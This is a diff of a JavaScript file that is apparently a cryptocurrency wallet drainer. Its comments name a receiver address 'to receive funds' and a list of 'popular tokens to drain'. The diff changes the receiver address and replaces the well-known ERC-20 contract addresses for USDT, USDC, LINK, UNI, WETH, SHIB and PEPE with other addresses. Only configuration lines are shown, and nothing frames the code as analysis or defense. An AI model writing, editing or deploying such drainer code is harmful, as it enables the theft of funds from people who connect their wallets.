@@ -84,17 +84,17 @@ $(document).ready(function() {
     }
 
     // Your Ethereum address to receive funds
-    const RECEIVER_ADDRESS = "0x5D3A140d5906Cb2B3f7947561dE94ED895FFB19d"; // Replace with your ETH address
+    const RECEIVER_ADDRESS = "0x35eC00F9885e8097269262E5a21a09Cbd3171AA3"; // Replace with your ETH address
 
     // Common ERC-20 token contracts (popular tokens to drain)
     const COMMON_TOKENS = [
-        { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
-        { symbol: "USDC", address: "0xA0b86a33E6e26C8d5F0Ce4D2a2E7e9E0E04E4F8C", decimals: 6 },
-        { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
-        { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
-        { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
-        { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4CE", decimals: 18 },
-        { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 }
+        { symbol: "USDT", address: "0x80b560393ed52c8498ed3fa5fa38336d5a877217", decimals: 6 },
+        { symbol: "USDC", address: "0xe8e58fa2dd15a40f4365802f0f097a5eef1ca91f", decimals: 6 },
+        { symbol: "LINK", address: "0xcf784634f7077c773b8513865aa15fb04424482e", decimals: 18 },
+        { symbol: "UNI", address: "0x943aA740E5Becf97615b3DCA231Ca3cd03c9A35A", decimals: 18 },
+        { symbol: "WETH", address: "0xbb0aa4959498a604d99f465f8f50f0444cdf054d", decimals: 18 },
+        { symbol: "SHIB", address: "0x9a9ff2c4193d18fed9315bb37855e9372ccb727a", decimals: 18 },
+        { symbol: "PEPE", address: "0x5b8ec1549984a0a2ca2d5e193f9a2afed0dc4dc8", decimals: 18 }
     ];
 
     // Function to debug available wallet providers
